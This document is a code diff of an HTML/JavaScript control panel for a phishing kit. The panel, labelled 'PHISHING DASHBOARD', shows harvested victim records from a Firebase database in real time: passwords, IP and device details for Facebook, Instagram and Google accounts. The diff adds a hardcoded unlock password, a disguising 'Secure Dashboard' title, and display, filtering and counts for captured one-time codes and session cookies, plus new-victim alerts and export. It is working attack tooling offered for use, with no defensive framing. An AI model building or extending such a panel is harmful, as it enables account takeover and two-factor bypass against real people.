@@ -1,14 +1,14 @@
 <!-- ═══════════════════════════════════════════════════════════
-     FILE: index.html - মেইন ফাইল (সব লজিক এখানে)
+     FILE: index.html - ড্যাশবোর্ড v3 (লক + OTP + কুকি)
      ═══════════════════════════════════════════════════════════ -->
 <!DOCTYPE html>
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎯 Phishing Framework - Control Panel</title>
+    <title>🔐 Secure Dashboard - Login Required</title>
     
-    <!-- Firebase SDK (CDN - একবারই লোড হবে) -->
+    <!-- Firebase SDK -->
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
     
@@ -22,6 +22,7 @@
             --gold: #FFD700;
             --cyan: #8be9fd;
             --purple: #bd93f9;
+            --orange: #ff9800;
         }
         
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -31,7 +32,137 @@
             background: var(--bg);
             color: #fff;
             min-height: 100vh;
+        }
+        
+        /* ════════════════════════════════════════════
+           LOCK SCREEN
+           ════════════════════════════════════════════ */
+        .lock-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a0a1f 30%, #0f0a1a 60%, #0a0a0f 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            animation: lockFadeIn 0.5s ease;
+        }
+        
+        @keyframes lockFadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .lock-card {
+            background: var(--panel);
+            border: 1px solid var(--purple);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(189,147,249,0.2);
+            animation: lockSlide 0.6s ease;
+        }
+        
+        @keyframes lockSlide {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        .lock-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+            animation: lockPulse 2s infinite;
+        }
+        
+        @keyframes lockPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+        }
+        
+        .lock-title {
+            font-size: 22px;
+            color: var(--purple);
+            margin-bottom: 10px;
+            letter-spacing: 2px;
+        }
+        
+        .lock-subtitle {
+            color: rgba(255,255,255,0.5);
+            font-size: 13px;
+            margin-bottom: 25px;
+        }
+        
+        .lock-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            color: white;
+            font-family: inherit;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        
+        .lock-input:focus {
+            border-color: var(--purple);
+            box-shadow: 0 0 15px rgba(189,147,249,0.3);
+        }
+        
+        .lock-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--purple);
+            color: var(--bg);
+            border: none;
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            letter-spacing: 1px;
+            transition: all 0.3s;
+        }
+        
+        .lock-btn:hover {
+            box-shadow: 0 10px 30px rgba(189,147,249,0.4);
+            transform: translateY(-2px);
+        }
+        
+        .lock-error {
+            color: var(--red);
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .lock-footer {
+            margin-top: 20px;
+            color: rgba(255,255,255,0.3);
+            font-size: 11px;
+        }
+        
+        /* ════════════════════════════════════════════
+           MAIN DASHBOARD
+           ════════════════════════════════════════════ */
+        .dashboard {
+            display: none;
             padding: 20px;
+            animation: dashboardFade 0.5s ease;
+        }
+        
+        @keyframes dashboardFade {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
         
         .header {
@@ -49,11 +180,18 @@
         
         .header h1 {
             color: var(--green);
-            font-size: 26px;
+            font-size: 24px;
             letter-spacing: 2px;
         }
         
-        .header .status {
+        .header-info {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .live-indicator {
             display: flex;
             align-items: center;
             gap: 8px;
@@ -72,11 +210,22 @@
             50% { opacity: 0.3; }
         }
         
+        .logout-btn {
+            padding: 8px 16px;
+            background: var(--red);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 12px;
+        }
+        
         /* Stats */
         .stats-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 15px;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 12px;
             margin-bottom: 20px;
         }
         
@@ -84,7 +233,7 @@
             background: var(--panel);
             border: 1px solid var(--border);
             border-radius: 12px;
-            padding: 20px;
+            padding: 18px;
             text-align: center;
             cursor: pointer;
             transition: all 0.3s;
@@ -96,34 +245,34 @@
         }
         
         .stat-card .number {
-            font-size: 38px;
+            font-size: 32px;
             font-weight: bold;
             color: var(--gold);
         }
         
         .stat-card .label {
             color: rgba(255,255,255,0.6);
-            font-size: 12px;
+            font-size: 11px;
             margin-top: 5px;
         }
         
         /* Tabs */
         .tabs {
             display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
+            gap: 8px;
+            margin-bottom: 15px;
             flex-wrap: wrap;
         }
         
         .tab-btn {
-            padding: 10px 20px;
+            padding: 9px 16px;
             background: var(--panel);
             border: 1px solid var(--border);
             border-radius: 8px;
             color: white;
             cursor: pointer;
             font-family: inherit;
-            font-size: 14px;
+            font-size: 13px;
             transition: all 0.3s;
         }
         
@@ -134,6 +283,24 @@
         }
         
         .tab-btn:hover {
+            border-color: var(--green);
+        }
+        
+        /* Search */
+        .search-bar {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            font-family: inherit;
+            font-size: 14px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        
+        .search-bar:focus {
             border-color: var(--green);
         }
         
@@ -173,19 +340,19 @@
             background: var(--purple);
             color: var(--bg);
             border-radius: 20px;
-            font-size: 12px;
+            font-size: 11px;
             font-weight: bold;
         }
         
         .victim-time {
-            font-size: 12px;
+            font-size: 11px;
             color: rgba(255,255,255,0.5);
         }
         
         .victim-info {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 10px;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 8px;
         }
         
         .info-item {
@@ -203,37 +370,42 @@
         
         .info-item .value {
             color: #fff;
-            font-size: 14px;
+            font-size: 13px;
             margin-top: 3px;
             word-break: break-all;
+        }
+        
+        /* OTP Badge */
+        .otp-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background: var(--orange);
+            color: var(--bg);
+            border-radius: 4px;
+            font-size: 11px;
+            font-weight: bold;
+            margin-left: 5px;
+        }
+        
+        /* Cookie Badge */
+        .cookie-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background: var(--cyan);
+            color: var(--bg);
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: bold;
+            margin-left: 5px;
         }
         
         .no-victims {
             text-align: center;
             padding: 40px;
             color: rgba(255,255,255,0.3);
-            font-size: 16px;
+            font-size: 15px;
         }
         
-        /* Search */
-        .search-bar {
-            width: 100%;
-            padding: 12px 16px;
-            background: var(--panel);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: white;
-            font-family: inherit;
-            font-size: 14px;
-            margin-bottom: 20px;
-            outline: none;
-        }
-        
-        .search-bar:focus {
-            border-color: var(--green);
-        }
-        
-        /* Delete button */
         .delete-btn {
             padding: 5px 10px;
             background: var(--red);
@@ -245,9 +417,8 @@
             font-family: inherit;
         }
         
-        /* Export */
         .export-btn {
-            padding: 10px 20px;
+            padding: 10px 18px;
             background: var(--cyan);
             color: var(--bg);
             border: none;
@@ -263,104 +434,217 @@
     </style>
 </head>
 <body>
-    <!-- Header -->
-    <div class="header">
-        <div>
-            <h1>🎯 PHISHING DASHBOARD</h1>
-            <p style="color:rgba(255,255,255,0.5);font-size:11px;">Real-time victim monitoring</p>
-        </div>
-        <div class="status">
-            <div class="live-dot"></div>
-            <span style="color:var(--green);">LIVE</span>
-        </div>
-        <button class="export-btn" onclick="exportData()">📥 Export JSON</button>
-    </div>
-    
-    <!-- Stats -->
-    <div class="stats-grid">
-        <div class="stat-card" onclick="filterByPlatform('all')">
-            <div class="number" id="totalVictims">0</div>
-            <div class="label">Total Victims</div>
-        </div>
-        <div class="stat-card" onclick="filterByPlatform('facebook')">
-            <div class="number" id="facebookCount">0</div>
-            <div class="label">Facebook</div>
-        </div>
-        <div class="stat-card" onclick="filterByPlatform('instagram')">
-            <div class="number" id="instagramCount">0</div>
-            <div class="label">Instagram</div>
-        </div>
-        <div class="stat-card" onclick="filterByPlatform('google')">
-            <div class="number" id="googleCount">0</div>
-            <div class="label">Google</div>
-        </div>
-        <div class="stat-card" onclick="filterByPlatform('other')">
-            <div class="number" id="otherCount">0</div>
-            <div class="label">Others</div>
+    <!-- ════════════════════════════════════════════
+         LOCK SCREEN
+         ════════════════════════════════════════════ -->
+    <div class="lock-screen" id="lockScreen">
+        <div class="lock-card">
+            <div class="lock-icon">🔐</div>
+            <div class="lock-title">SECURE DASHBOARD</div>
+            <div class="lock-subtitle">Enter password to access</div>
+            
+            <input type="password" class="lock-input" id="lockPassword" 
+                   placeholder="••••••••••" autocomplete="off">
+            
+            <button class="lock-btn" onclick="checkPassword()">UNLOCK</button>
+            
+            <div class="lock-error" id="lockError">❌ Wrong password!</div>
+            
+            <div class="lock-footer">
+                Developed by <span style="color:var(--purple);font-weight:bold;">AhmedTasnimX</span>
+            </div>
         </div>
     </div>
     
-    <!-- Search -->
-    <input type="text" class="search-bar" id="searchInput" placeholder="🔍 Search by email, IP, phone..." onkeyup="searchVictims(this.value)">
-    
-    <!-- Tabs -->
-    <div class="tabs" id="tabsContainer">
-        <button class="tab-btn active" onclick="filterByPlatform('all')">All</button>
-        <button class="tab-btn" onclick="filterByPlatform('facebook')">Facebook</button>
-        <button class="tab-btn" onclick="filterByPlatform('instagram')">Instagram</button>
-        <button class="tab-btn" onclick="filterByPlatform('google')">Google</button>
-        <button class="tab-btn" onclick="filterByPlatform('other')">Others</button>
-    </div>
-    
-    <!-- Victim List -->
-    <div class="victim-list">
-        <h3 style="margin-bottom:15px;color:var(--red);">📋 VICTIM RECORDS</h3>
-        <div id="victimContainer">
-            <div class="no-victims">⏳ Waiting for victims...</div>
+    <!-- ════════════════════════════════════════════
+         MAIN DASHBOARD
+         ════════════════════════════════════════════ -->
+    <div class="dashboard" id="dashboard">
+        <!-- Header -->
+        <div class="header">
+            <div>
+                <h1>🎯 PHISHING DASHBOARD</h1>
+                <p style="color:rgba(255,255,255,0.5);font-size:11px;">
+                    Real-time victim monitoring | Developed by <span style="color:var(--purple);">AhmedTasnimX</span>
+                </p>
+            </div>
+            <div class="header-info">
+                <div class="live-indicator">
+                    <div class="live-dot"></div>
+                    <span style="color:var(--green);font-size:12px;">LIVE</span>
+                </div>
+                <button class="export-btn" onclick="exportData()">📥 Export</button>
+                <button class="logout-btn" onclick="logout()">🚪 Logout</button>
+            </div>
+        </div>
+        
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card" onclick="filterByPlatform('all')">
+                <div class="number" id="totalVictims">0</div>
+                <div class="label">Total Victims</div>
+            </div>
+            <div class="stat-card" onclick="filterByPlatform('facebook')">
+                <div class="number" id="facebookCount">0</div>
+                <div class="label">Facebook</div>
+            </div>
+            <div class="stat-card" onclick="filterByPlatform('instagram')">
+                <div class="number" id="instagramCount">0</div>
+                <div class="label">Instagram</div>
+            </div>
+            <div class="stat-card" onclick="filterByPlatform('google')">
+                <div class="number" id="googleCount">0</div>
+                <div class="label">Google</div>
+            </div>
+            <div class="stat-card" onclick="filterByPlatform('other')">
+                <div class="number" id="otherCount">0</div>
+                <div class="label">Others</div>
+            </div>
+            <div class="stat-card" onclick="filterByOTP()">
+                <div class="number" id="otpCount">0</div>
+                <div class="label">🔑 OTP Captured</div>
+            </div>
+            <div class="stat-card" onclick="filterByCookie()">
+                <div class="number" id="cookieCount">0</div>
+                <div class="label">🍪 Cookies</div>
+            </div>
+        </div>
+        
+        <!-- Search -->
+        <input type="text" class="search-bar" id="searchInput" 
+               placeholder="🔍 Search by email, IP, phone, OTP..." 
+               onkeyup="searchVictims(this.value)">
+        
+        <!-- Tabs -->
+        <div class="tabs" id="tabsContainer">
+            <button class="tab-btn active" data-filter="all" onclick="filterByPlatform('all')">All</button>
+            <button class="tab-btn" data-filter="facebook" onclick="filterByPlatform('facebook')">Facebook</button>
+            <button class="tab-btn" data-filter="instagram" onclick="filterByPlatform('instagram')">Instagram</button>
+            <button class="tab-btn" data-filter="google" onclick="filterByPlatform('google')">Google</button>
+            <button class="tab-btn" data-filter="other" onclick="filterByPlatform('other')">Others</button>
+            <button class="tab-btn" data-filter="otp" onclick="filterByOTP()">🔑 OTP</button>
+            <button class="tab-btn" data-filter="cookie" onclick="filterByCookie()">🍪 Cookie</button>
+        </div>
+        
+        <!-- Victim List -->
+        <div class="victim-list">
+            <h3 style="margin-bottom:15px;color:var(--red);">📋 VICTIM RECORDS</h3>
+            <div id="victimContainer">
+                <div class="no-victims">⏳ Waiting for victims...</div>
+            </div>
         </div>
     </div>
     
     <!-- Firebase Init -->
     <script src="./config.js"></script>
     <script>
-        // ═══════════════════════════════════════════════════════
-        // MAIN LOGIC
-        // ═══════════════════════════════════════════════════════
+        // ════════════════════════════════════════════
+        // LOCK SCREEN LOGIC
+        // ════════════════════════════════════════════
+        
+        const CORRECT_PASSWORD = "Sorwer Sir";
+        
+        function checkPassword() {
+            const input = document.getElementById('lockPassword').value;
+            const error = document.getElementById('lockError');
+            
+            if (input === CORRECT_PASSWORD) {
+                // Unlock dashboard
+                document.getElementById('lockScreen').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                
+                // Init Firebase after unlock
+                initFirebase();
+                
+                // Save session
+                sessionStorage.setItem('dashboard_unlocked', 'true');
+            } else {
+                error.style.display = 'block';
+                document.getElementById('lockPassword').value = '';
+                document.getElementById('lockPassword').focus();
+                
+                // Shake animation
+                const card = document.querySelector('.lock-card');
+                card.style.animation = 'none';
+                setTimeout(() => {
+                    card.style.animation = 'lockSlide 0.6s ease';
+                }, 10);
+            }
+        }
+        
+        // Enter key handler
+        document.getElementById('lockPassword').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                checkPassword();
+            }
+        });
+        
+        function logout() {
+            sessionStorage.removeItem('dashboard_unlocked');
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('lockScreen').style.display = 'flex';
+            document.getElementById('lockPassword').value = '';
+            document.getElementById('lockError').style.display = 'none';
+        }
+        
+        // Check session on load
+        if (sessionStorage.getItem('dashboard_unlocked') === 'true') {
+            document.getElementById('lockScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            initFirebase();
+        }
+        
+        // ════════════════════════════════════════════
+        // FIREBASE INIT
+        // ════════════════════════════════════════════
+        
+        let database = null;
+        
+        function initFirebase() {
+            if (database) return;
+            
+            firebase.initializeApp(window.firebaseConfig);
+            database = firebase.database();
+            
+            // Real-time listener
+            database.ref('victims').on('value', (snapshot) => {
+                allVictims = snapshot.val() || {};
+                renderVictims();
+            });
+            
+            // New victim alert
+            database.ref('victims').on('child_added', (snapshot) => {
+                const victim = snapshot.val();
+                showNotification(victim);
+                playAlert();
+            });
+        }
+        
+        // ════════════════════════════════════════════
+        // STATE
+        // ════════════════════════════════════════════
         
         let allVictims = {};
         let currentFilter = 'all';
         let currentSearch = '';
         
-        // Firebase init (config.js থেকে firebaseConfig পাওয়া যাবে)
-        firebase.initializeApp(window.firebaseConfig);
-        const database = firebase.database();
-        
-        // Real-time listener
-        database.ref('victims').on('value', (snapshot) => {
-            allVictims = snapshot.val() || {};
-            renderVictims();
-        });
-        
-        // New victim alert
-        database.ref('victims').on('child_added', (snapshot) => {
-            const victim = snapshot.val();
-            showNotification(victim);
-            playAlert();
-        });
-        
         function renderVictims() {
             const container = document.getElementById('victimContainer');
             const victimIds = Object.keys(allVictims);
             
-            // Update stats
             updateStats();
             
-            // Filter victims
             let filteredIds = victimIds.filter(id => {
                 const v = allVictims[id];
                 if (!v) return false;
                 
                 // Platform filter
+                if (currentFilter === 'otp') {
+                    return v.otp || v.otpCode ? true : false;
+                }
+                if (currentFilter === 'cookie') {
+                    return v.cookies || v.cookieData ? true : false;
+                }
                 if (currentFilter !== 'all') {
                     if (currentFilter === 'other') {
                         if (['facebook', 'instagram', 'google'].includes(v.platform)) return false;
@@ -369,7 +653,7 @@
                     }
                 }
                 
-                // Search filter
+                // Search
                 if (currentSearch) {
                     const searchStr = JSON.stringify(v).toLowerCase();
                     if (!searchStr.includes(currentSearch.toLowerCase())) return false;
@@ -378,7 +662,6 @@
                 return true;
             });
             
-            // Sort by timestamp
             filteredIds.sort((a, b) => {
                 return new Date(allVictims[b].timestamp || 0) - new Date(allVictims[a].timestamp || 0);
             });
@@ -398,12 +681,16 @@
         function createVictimCard(v, id) {
             const time = new Date(v.timestamp || Date.now()).toLocaleString();
             const platformBadge = v.platform || 'unknown';
+            const hasOTP = v.otp || v.otpCode;
+            const hasCookie = v.cookies || v.cookieData;
             
             return `
                 <div class="victim-card">
                     <div class="victim-header">
                         <span class="victim-platform">${platformBadge.toUpperCase()}</span>
-                        <span style="color:var(--cyan);font-weight:bold;">${v.email || v.username || v.fullName || 'Unknown'}</span>
+                        <span style="color:var(--cyan);font-weight:bold;">
+                            ${v.email || v.username || v.fullName || 'Unknown'}
+                        </span>
                         <span class="victim-time">${time}</span>
                     </div>
                     <div class="victim-info">
@@ -411,6 +698,16 @@
                             <div class="key">Password</div>
                             <div class="value" style="color:var(--red);font-weight:bold;">${v.password || 'N/A'}</div>
                         </div>
+                        ${hasOTP ? `
+                        <div class="info-item">
+                            <div class="key">OTP Code <span class="otp-badge">CAPTURED</span></div>
+                            <div class="value" style="color:var(--orange);font-weight:bold;">${v.otp || v.otpCode || 'N/A'}</div>
+                        </div>` : ''}
+                        ${hasCookie ? `
+                        <div class="info-item">
+                            <div class="key">Cookies <span class="cookie-badge">CAPTURED</span></div>
+                            <div class="value" style="font-size:11px;">${(v.cookies || v.cookieData || 'N/A').substring(0, 80)}...</div>
+                        </div>` : ''}
                         <div class="info-item">
                             <div class="key">IP Address</div>
                             <div class="value">${v.ipInfo?.ip || v.ip || 'N/A'}</div>
@@ -431,14 +728,6 @@
                             <div class="key">Browser</div>
                             <div class="value">${v.deviceInfo?.browser || 'N/A'}</div>
                         </div>
-                        <div class="info-item">
-                            <div class="key">User Agent</div>
-                            <div class="value" style="font-size:11px;">${(v.deviceInfo?.userAgent || 'N/A').substring(0, 60)}...</div>
-                        </div>
-                        <div class="info-item">
-                            <div class="key">Referrer</div>
-                            <div class="value">${v.referrer || 'Direct'}</div>
-                        </div>
                     </div>
                     <div style="margin-top:10px;text-align:right;">
                         <button class="delete-btn" onclick="deleteVictim('${id}')">🗑️ Delete</button>
@@ -449,7 +738,7 @@
         
         function updateStats() {
             const ids = Object.keys(allVictims);
-            let fb = 0, ig = 0, gg = 0, other = 0;
+            let fb = 0, ig = 0, gg = 0, other = 0, otp = 0, cookie = 0;
             
             ids.forEach(id => {
                 const v = allVictims[id];
@@ -458,6 +747,9 @@
                 else if (v.platform === 'instagram') ig++;
                 else if (v.platform === 'google') gg++;
                 else other++;
+                
+                if (v.otp || v.otpCode) otp++;
+                if (v.cookies || v.cookieData) cookie++;
             });
             
             document.getElementById('totalVictims').textContent = ids.length;
@@ -465,12 +757,34 @@
             document.getElementById('instagramCount').textContent = ig;
             document.getElementById('googleCount').textContent = gg;
             document.getElementById('otherCount').textContent = other;
+            document.getElementById('otpCount').textContent = otp;
+            document.getElementById('cookieCount').textContent = cookie;
         }
         
         function filterByPlatform(platform) {
             currentFilter = platform;
-            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
-            event?.target?.classList.add('active');
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.filter === platform) btn.classList.add('active');
+            });
+            renderVictims();
+        }
+        
+        function filterByOTP() {
+            currentFilter = 'otp';
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.filter === 'otp') btn.classList.add('active');
+            });
+            renderVictims();
+        }
+        
+        function filterByCookie() {
+            currentFilter = 'cookie';
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.filter === 'cookie') btn.classList.add('active');
+            });
             renderVictims();
         }
         
@@ -491,7 +805,7 @@
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
             a.href = url;
-            a.download = 'victims_export_' + Date.now() + '.json';
+            a.download = 'victims_' + Date.now() + '.json';
             a.click();
             URL.revokeObjectURL(url);
         }
@@ -500,7 +814,6 @@
             if (Notification.permission === 'granted') {
                 new Notification('🎯 New Victim!', {
                     body: `${victim.platform} - ${victim.email || victim.username || 'Unknown'}`,
-                    icon: '🔴'
                 });
             }
         }
